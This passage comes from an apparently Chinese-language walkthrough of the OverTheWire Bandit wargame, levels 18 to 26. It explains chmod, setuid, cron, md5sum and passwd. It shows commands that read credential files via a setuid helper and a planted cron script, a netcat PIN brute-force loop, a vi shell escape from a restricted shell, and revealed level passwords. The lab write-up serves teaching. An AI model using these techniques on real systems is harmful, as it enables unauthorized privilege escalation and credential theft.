readme</span></span><br><span class="line"><span class="string">ubuntu@ubuntu:~$ ssh -p2220 bandit18@bandit.labs.overthewire.org cat readme</span></span><br><span class="line"><span class="string">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bandit18@bandit.labs.overthewire.org&#x27;</span>s password: </span><br><span class="line">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span><br></pre></td></tr></table></figure><p>OR us  Options:  -T:禁止分配伪终端                虽然没有伪终端，但这时我们依旧可以使用shell</p><h2 id="Level-19➡Level-20"><a href="#Level-19➡Level-20" class="headerlink" title="Level_19➡Level_20"></a>Level_19➡Level_20</h2><h2 id="Learn-about-chmod-and-setuid"><a href="#Learn-about-chmod-and-setuid" class="headerlink" title="Learn about chmod and setuid:"></a><strong>Learn about chmod and setuid:</strong></h2><p>chmod:(change mode）控制用户对文件的权限的命令</p><p>Linux/Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）。</p><p><img src="https://i.loli.net/2021/04/21/YSLunpTbOdlBr8M.jpg" alt="file-permissions-rwx.jpg"></p><p>只有文件所有者和超级用户可以修改文件或目录的权限。可以使用绝对模式（八进制数字模式），符号模式指定文件的权限。</p><p><img src="https://i.loli.net/2021/04/21/NJEzA2aiuWtwfL7.png" alt="rwx-standard-unix-permission-bits.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [-cfvR] [--<span class="built_in">help</span>] [--version] mode file...</span><br></pre></td></tr></table></figure><p>Options:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ugoa...][[+-&#x3D;][rwxX]...][,...]</span><br></pre></td></tr></table></figure><ul><li><p>u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</p></li><li><p>+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。</p></li><li><p>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。</p><p>符号模式</p><p>使用符号模式可以设置多个项目：who（用户类型），operator（操作符）和  permission（权限），每个项目的设置可以用逗号隔开。 命令 chmod 将修改 who  指定的用户类型对文件的访问权限，用户类型由一个或者多个字母在 who 的位置来说明，如 who 的符号模式表所示:</p><p>| who  | 用户类型 | 说明                   |<br>| —— | ———— | ——————————— |<br>| <code>u</code>  | user     | 文件所有者             |<br>| <code>g</code>  | group    | 文件所有者所在组       |<br>| <code>o</code>  | others   | 所有其他用户           |<br>| <code>a</code>  | all      | 所用用户, 相当于 <em>ugo</em> |</p></li></ul><p>operator 的符号模式表:</p><div class="table-container"><table><thead><tr><th>Operator</th><th>说明</th></tr></thead><tbody><tr><td><code>+</code></td><td>为指定的用户类型增加权限</td></tr><tr><td><code>-</code></td><td>去除指定用户类型的权限</td></tr><tr><td><code>=</code></td><td>设置指定用户权限的设置，即将用户类型的所有权限重新设置</td></tr></tbody></table></div><p>permission 的符号模式表:</p><div class="table-container"><table><thead><tr><th>模式</th><th>名字</th><th>说明</th></tr></thead><tbody><tr><td><code>r</code></td><td>读</td><td>设置为可读权限</td></tr><tr><td><code>w</code></td><td>写</td><td>设置为可写权限</td></tr><tr><td><code>x</code></td><td>执行权限</td><td>设置为可执行权限</td></tr><tr><td><code>X</code></td><td>特殊执行权限</td><td>只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行</td></tr><tr><td><code>s</code></td><td>setuid/gid</td><td>当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限</td></tr><tr><td><code>t</code></td><td>粘贴位</td><td>设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位</td></tr></tbody></table></div><h3 id="八进制语法"><a href="#八进制语法" class="headerlink" title="八进制语法"></a>八进制语法</h3><p>chmod命令可以使用八进制数来指定权限。文件或目录的权限位是由9个权限位来控制，每三位为一组，它们分别是文件所有者（User）的读、写、执行，用户组（Group）的读、写、执行以及其它用户（Other）的读、写、执行。历史上，文件权限被放在一个比特掩码中，掩码中指定的比特位设为1，用来说明一个类具有相应的优先级。</p><div class="table-container"><table><thead><tr><th>#</th><th>权限</th><th>rwx</th><th>二进制</th></tr></thead><tbody><tr><td>7</td><td>读 + 写 + 执行</td><td>rwx</td><td>111</td></tr><tr><td>6</td><td>读 + 写</td><td>rw-</td><td>110</td></tr><tr><td>5</td><td>读 + 执行</td><td>r-x</td><td>101</td></tr><tr><td>4</td><td>只读</td><td>r—</td><td>100</td></tr><tr><td>3</td><td>写 + 执行</td><td>-wx</td><td>011</td></tr><tr><td>2</td><td>只写</td><td>-w-</td><td>010</td></tr><tr><td>1</td><td>只执行</td><td>—x</td><td>001</td></tr><tr><td>0</td><td>无</td><td>—-</td><td>000</td></tr></tbody></table></div><p>Demo: chmod 765</p><ul><li>所有者的权限用数字表达：属主的那三个权限位的数字加起来的总和。如 rwx ，也就是 4+2+1 ，应该是 7。</li><li>用户组的权限用数字表达：属组的那个权限位数字的相加的总和。如 rw- ，也就是 4+2+0 ，应该是 6。</li><li>其它用户的权限数字表达：其它用户权限位的数字相加的总和。如 r-x ，也就是 4+0+1 ，应该是 5。</li></ul><p>Demo:</p><p>将文件 file1.txt 设为所有人皆可读取 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ugo+r file1.txt</span><br></pre></td></tr></table></figure><p>将文件 file1.txt 设为所有人皆可读取 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+r file1.txt</span><br></pre></td></tr></table></figure><p>将文件 file1.txt 与 file2.txt 设为该文件拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug+w,o-w file1.txt file2.txt</span><br></pre></td></tr></table></figure><p>为 ex1.py 文件拥有者增加可执行权限:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x ex1.py</span><br></pre></td></tr></table></figure><p>将目前目录下的所有文件与子目录皆设为任何人可读取 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R a+r *</span><br></pre></td></tr></table></figure><p>setuid:</p><p>SUID 特殊权限仅适用于可执行文件，所具有的功能是，只要用户对设有 SUID 的文件有执行权限，那么当用户执行此文件时，会以文件所有者的身份去执行此文件，一旦文件执行结束，身份的切换也随之消失。</p><p>所以我们以bandit20身份cat flag即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bandit19@bandit:~$ ./bandit20-do </span><br><span class="line">Run a <span class="built_in">command</span> as another user.</span><br><span class="line">  Example: ./bandit20-do id</span><br><span class="line">bandit19@bandit:~$ ./bandit20-do id</span><br><span class="line">uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)</span><br><span class="line">bandit19@bandit:~$ cat /etc/bandit_pass/bandit20</span><br><span class="line">cat: /etc/bandit_pass/bandit20: Permission denied</span><br><span class="line">bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20</span><br><span class="line">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br></pre></td></tr></table></figure><h2 id="Level-20➡Level-21"><a href="#Level-20➡Level-21" class="headerlink" title="Level_20➡Level_21"></a>Level_20➡Level_21</h2><p>其实就是开启多个shell窗口用nc在同一个端口下通信:</p><p><strong>Terminal 1 (host):</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit20@melinda:~$ nc -nvlp 44444</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 44444)</span><br><span class="line">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br><span class="line">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr   &#x2F;&#x2F;get flag</span><br></pre></td></tr></table></figure><p><strong>Terminal 2 (client):</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit20@melinda:~$ .&#x2F;suconnect 44444</span><br><span class="line">Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br></pre></td></tr></table></figure><h2 id="Level-21➡Level-22"><a href="#Level-21➡Level-22" class="headerlink" title="Level_21➡Level_22"></a>Level_21➡Level_22</h2><h2 id="Learn-about-crontab"><a href="#Learn-about-crontab" class="headerlink" title="Learn about crontab:"></a><strong>Learn about crontab:</strong></h2><p><code>crontab</code>是一个可以根据时间、日期、月份、星期的组合调度对重复任务的执行的守护进程。</p><p><code>crontab</code>文件中，每一行代表一个任务；每行有六列，每列代表一项设置，前五列为时间频率设定，第六列是要执行的任务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">minute hour day mouth week command  #分 时 日 月 周 命令</span><br></pre></td></tr></table></figure><p><code>minute</code>表示分钟，可以是0~59的任意整数。<br> <code>hour</code>表示小时，可以是2~23的任意整数<br> <code>day</code>表示日期，可以是1~31的任意整数<br> <code>month</code>表示月份，可以是1~12的任意整数<br> <code>week</code>表示星期几，可以是0~7之间的整数，0或者7表示星期天<br> <code>command</code>表示执行的命令</p><p>上面的设置除了数字之外还可以使用特殊字符：<br> 星号<code>*</code>：表示所有可能的值，可以理解每隔。<br> 逗号<code>,</code>：用逗号隔开的值表示一个列表范围，如1,2,3 <em> </em> <em> </em>每天每小时的第一、第二、第三分钟。<br> 中杠<code>-</code>：用中杠隔开的值表示一个数值范围，如1-10 <em> </em> <em> </em>每天每小时的1到10分钟。<br> 正斜线<code>/</code>：指定执行任务的间隔频率，如 0 10-18/2 <em> </em> *每天的十点到十八点间隔2小时执行。</p><p>Demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 每分钟执行一次</span></span><br><span class="line">* * * * * </span><br><span class="line"><span class="meta">#</span><span class="bash"> 每小时的第3和第15分钟执行</span></span><br><span class="line">3,15 * * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">在上午的8点到11点的第3和第15分钟执行</span></span><br><span class="line">3,15 8-11 * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">在每隔2天的上午8点和11点的第3和第15分钟执行</span></span><br><span class="line">3,15 8-11 */2 * *</span><br><span class="line"><span class="meta">#</span><span class="bash">每个星期一的上午8点到11点的第3和第15分钟执行</span></span><br><span class="line">3,15 8-11 * * 1</span><br><span class="line"><span class="meta">#</span><span class="bash">每晚的21：30执行</span></span><br><span class="line">30 21 * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">每月1、10、22日的4:30执行</span></span><br><span class="line">30 4 1,10,22 * *</span><br><span class="line"><span class="meta">#</span><span class="bash">每周六、日1:10执行</span></span><br><span class="line">10 1 * * 6,7</span><br><span class="line"><span class="meta">#</span><span class="bash">每天18:00到23:00之间每隔30分钟执行</span></span><br><span class="line">0/30 18-23 * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">星期六的23:00执行</span></span><br><span class="line">0 23 * * 6</span><br><span class="line"><span class="meta">#</span><span class="bash">每小时执行一次</span></span><br><span class="line">* */1 * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">晚上11点到早上7点之间，每小时执行一次</span></span><br><span class="line">* 23-7/1 * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">每月的4号与每周一到周三的11点</span></span><br><span class="line">0 11 4 * 1-3</span><br><span class="line"><span class="meta">#</span><span class="bash">一月一号的4点</span></span><br><span class="line">0 4 1 1 *</span><br></pre></td></tr></table></figure><p>Cron also offers some special strings, which can be used in place of the five time-and-date fields:</p><ul><li>| <strong>string</strong> | <strong>meaning</strong>                    |<br>| ————— | ——————————————— |<br>| @reboot    | Run once, at startup.          |<br>| @yearly    | Run once a year, “0 0 1 1 <em>“.  |<br>| @annually  | (same as @yearly)              |<br>| @monthly   | Run once a month, “0 0 1 </em> <em>“. |<br>| @weekly    | Run once a week, “0 0 </em> <em> 0”.  |<br>| @daily     | Run once a day, “0 0 </em> <em> </em>“.   |<br>| @midnight  | (same as @daily)               |<br>| @hourly    | Run once an hour, “0 <em> </em> <em> </em>“. |</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bandit21@bandit:~$ <span class="built_in">cd</span> /etc/cron.d</span><br><span class="line">bandit21@bandit:/etc/cron.d$ ls</span><br><span class="line">cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24</span><br><span class="line">cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat cronjob_bandit_bandit22</span><br><span class="line">cat: cronjob_bandit_bandit22: No such file or directory</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat cronjob_bandit_22</span><br><span class="line">cat: cronjob_bandit_22: No such file or directory</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22</span><br><span class="line">@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">bandit21@bandit:/etc/cron.d$ ls</span><br><span class="line">cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24</span><br><span class="line">cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span><br></pre></td></tr></table></figure><h2 id="Level-22➡Level-23"><a href="#Level-22➡Level-23" class="headerlink" title="Level_22➡Level_23"></a>Level_22➡Level_23</h2><h2 id="Learn-about-md5sum-and-command-cut"><a href="#Learn-about-md5sum-and-command-cut" class="headerlink" title="Learn about md5sum and command cut:"></a><strong>Learn about md5sum and command cut:</strong></h2><p>MD5算法常常被用来验证网络文件传输的完整性，防止文件被人篡改。MD5 全称是报文摘要算法（Message-Digest  Algorithm  5），此算法对任意长度的信息逐位进行计算，产生一个二进制长度为128位（十六进制长度就是32位）的“指纹”（或称“报文摘要”），不同的文件产生相同的报文摘要的可能性是非常非常之小的。</p><p>cut命令用于显示每行从开头算起 num1 到 num2 的文字。</p><p>cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</p><p>如果不指定 File 参数，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。</p><p>Options:</p><ul><li>-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。</li><li>-c ：以字符为单位进行分割。</li><li>-d ：自定义分隔符，默认为制表符。</li><li>-f  ：与-d一起使用，指定显示哪个区域。</li><li>-n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的<br>范围之内，该字符将被写出；否则，该字符将被排除</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:~$ <span class="built_in">cd</span> /etc/cron.d</span><br><span class="line">bandit22@bandit:/etc/cron.d$ ls</span><br><span class="line">cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24</span><br><span class="line">cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23</span><br><span class="line">@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">myname=$(whoami)</span><br><span class="line">mytarget=$(<span class="built_in">echo</span> I am user <span class="variable">$myname</span> | md5sum | cut -d <span class="string">&#x27; &#x27;</span> -f 1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Copying passwordfile /etc/bandit_pass/<span class="variable">$myname</span> to /tmp/<span class="variable">$mytarget</span>&quot;</span></span><br><span class="line"></span><br><span class="line">cat /etc/bandit_pass/<span class="variable">$myname</span> &gt; /tmp/<span class="variable">$mytarget</span></span><br><span class="line">bandit22@bandit:/etc/cron.d$ whoami</span><br><span class="line">bandit22</span><br><span class="line">bandit22@bandit:/etc/cron.d$ ls -al</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x  2 root root 4096 Jul 11  2020 .</span><br><span class="line">drwxr-xr-x 87 root root 4096 May 14  2020 ..</span><br><span class="line">-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit15_root</span><br><span class="line">-rw-r--r--  1 root root   62 Jul 11  2020 cronjob_bandit17_root</span><br><span class="line">-rw-r--r--  1 root root  120 May  7  2020 cronjob_bandit22</span><br><span class="line">-rw-r--r--  1 root root  122 May  7  2020 cronjob_bandit23</span><br><span class="line">-rw-r--r--  1 root root  120 May 14  2020 cronjob_bandit24</span><br><span class="line">-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit25_root</span><br><span class="line">-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder</span><br><span class="line">bandit22@bandit:/etc/cron.d$ <span class="built_in">echo</span> I am user bandit23| md5sum</span><br><span class="line">8ca319486bfbbc3663ea0fbe81326349  -</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349</span><br><span class="line">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</span><br><span class="line">bandit22@bandit:/etc/cron.d$ </span><br></pre></td></tr></table></figure><p>Descriptions:</p><p>md5sum: 显示或检查 MD5(128-bit) 校验和,若没有文件选项，或者文件处为”-“，则从标准输入读取。<br>echo <strong>-n</strong> : 不打印换行符。(注意: echo -n 后面的-n参数必须加上, 这样算出的字符串的md5值才正确)<br>cut:  cut用来从标准输入或文本文件中剪切列或域。剪切文本可以将之粘贴到一个文本文件。 -d 指定与空格和tab键不同的域分隔符。-f1 表示第一个域。</p><h2 id="Level-23➡Level-24"><a href="#Level-23➡Level-24" class="headerlink" title="Level_23➡Level_24"></a>Level_23➡Level_24</h2><p><strong>Ez_shell_code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">myname=$(whoami)</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/spool/<span class="variable">$myname</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Executing and deleting all scripts in /var/spool/<span class="variable">$myname</span>:&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> * .*;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$i</span>&quot;</span> != <span class="string">&quot;.&quot;</span> -a <span class="string">&quot;<span class="variable">$i</span>&quot;</span> != <span class="string">&quot;..&quot;</span> ];</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Handling <span class="variable">$i</span>&quot;</span></span><br><span class="line">        owner=<span class="string">&quot;<span class="subst">$(stat --format <span class="string">&quot;%U&quot;</span> ./$i)</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;owner&#125;</span>&quot;</span> = <span class="string">&quot;bandit23&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            timeout -s 9 60 ./<span class="variable">$i</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        rm -f ./<span class="variable">$i</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>Analyse:</p><p>shell脚本分析：</p><p>间隔时间执行/var/spool/bandit24 目录下的文件然后删除</p><p>我们编写个shell脚本输出即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit23@bandit:/var/spool/bandit24$ vim fuck.sh</span><br><span class="line">bandit23@bandit:/var/spool/bandit24$ chmod 777 fuck.sh</span><br></pre></td></tr></table></figure><p>fuck.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/bandit_pass/bandit24 &gt; /tmp/i_got_it</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit23@bandit:~$ cat /tmp/i_got_it</span><br><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br></pre></td></tr></table></figure><h2 id="Level-24➡Level-25"><a href="#Level-24➡Level-25" class="headerlink" title="Level_24➡Level_25"></a>Level_24➡Level_25</h2><p><strong>basic_shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br><span class="line">pass24=&quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ&quot;</span><br><span class="line">nc localhost 30002</span><br><span class="line">for i in &#123;0..9&#125;&#123;0..9&#125;&#123;0..9&#125;&#123;0..9&#125;</span><br><span class="line">do</span><br><span class="line">    echo $pass24&#x27; &#x27;$i &gt;&gt; dict</span><br><span class="line">done</span><br><span class="line">cat ./dict | nc localhost 30002 &gt;&gt; re</span><br><span class="line">sort re | uniq -u</span><br></pre></td></tr></table></figure><h2 id="Level-25➡Level-26"><a href="#Level-25➡Level-26" class="headerlink" title="Level_25➡Level_26"></a>Level_25➡Level_26</h2><p>Tips:The shell for user bandit26 is not <strong>/bin/bash</strong></p><p>根据提示我们查看bandit26的/etc/passwd 文件</p><h2 id="Learn-about-the-passwd"><a href="#Learn-about-the-passwd" class="headerlink" title="Learn about the passwd"></a><strong>Learn about the passwd</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> passwd文件是以行为单位的配置文件，每行定义系统上的一个用户，行内分为字段，字段之间由一个冒号隔开。这些字段依次为：</span><br><span class="line">用户名：密码：用户ID：主要组ID：GECOS：主目录：登录shell</span><br><span class="line">字段解释：</span><br><span class="line">用户名：就是一个用户名，登录时候用的</span><br><span class="line">密码：在旧的UNIX系统上，这个字段含有用户的加密密码，为了安全性，现在的linux均显示为x或*号</span><br><span class="line">用户ID：linux内核用于识别用户的一个整数ID</span><br><span class="line">主要组ID：linux内核用于识别用户主要组的一个整数ID</span><br><span class="line">GECOS：用户全名，安装linux时如果不输入全名，则显示为跟用户名一样，如果输入，则显示为全名（不可用于登录）</span><br><span class="line">主目录：用户登录时，他的登录Shell将使用这个目录作为当前工作目录</span><br><span class="line">登录Shell：用户登录时的默认Shell，在redhat 企业版中，登录shell通常是&#x2F;bin&#x2F;bash </span><br></pre></td></tr></table></figure><p>Three types of users:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 3种类型的用户</span><br><span class="line">普通用户：普通用户是使用系统真实用户人群。普通用户通常把&#x2F;bin&#x2F;bash作为登录Shell和&#x2F;home的子目录作为主目录。一般情况下，普通用户只在自己的主目录和系统范围内的临时目录里（如&#x2F;tmp和&#x2F;var&#x2F;tmp）创建文件。在redhat企业版linux中，普通用户的用户ID数通常大于500.</span><br><span class="line"> </span><br><span class="line">root用户：用户ID为0的用户，也被称为超级用户，root用户在系统上拥有完全权限，可以修改和删除任何文件，可以运行任何命令，可以取消任何进程。root用户负责增加和保留其他用户、配置硬件、添加系统软件。虽然root用户可以在系统上的任何地方创建文件，但它也通常使用&#x2F;root作为主目录</span><br><span class="line"> </span><br><span class="line">系统用户：大多数linux系统保留一系列低UID值用户作为系统用户，系统用户不代表人，而代表系统的组成部分。例如，运行Apache网络服务器的进程经常作为用户apache（ 见上面的passwd文件中apache用户信息）来运行。系统用户一般没有登录Shell，因为它不代表实际登录的用户。同样，系统用户的主目录很少在&#x2F;home中，而通常在属于相关应用的系统目录中。例如，用户apache的主目录是&#x2F;var&#x2F;www。在redhat企业版linux中，系统用户的UID值范围在1-499之间。 </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bandit25@bandit:~$ cat /etc/passwd|grep bandit26</span><br><span class="line">bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext</span><br><span class="line">bandit25@bandit:~$ cat /usr/bin/showtext</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> TERM=linux</span><br><span class="line"></span><br><span class="line">more ~/text.txt</span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><p>将命令窗口调最小自动触发more，然后修改shell为bash即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按下v键进入vi编辑模式，然后更改shell为bash即可</span></span><br><span class="line">:<span class="built_in">set</span> shell sh=/bin/bash  <span class="comment">#vim命令设置shell</span></span><br><span class="line">:sh                      <span class="comment">#vim中执行shell</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bandit26@bandit:~$ cat /etc/bandit_pass/bandit26</span><br><span 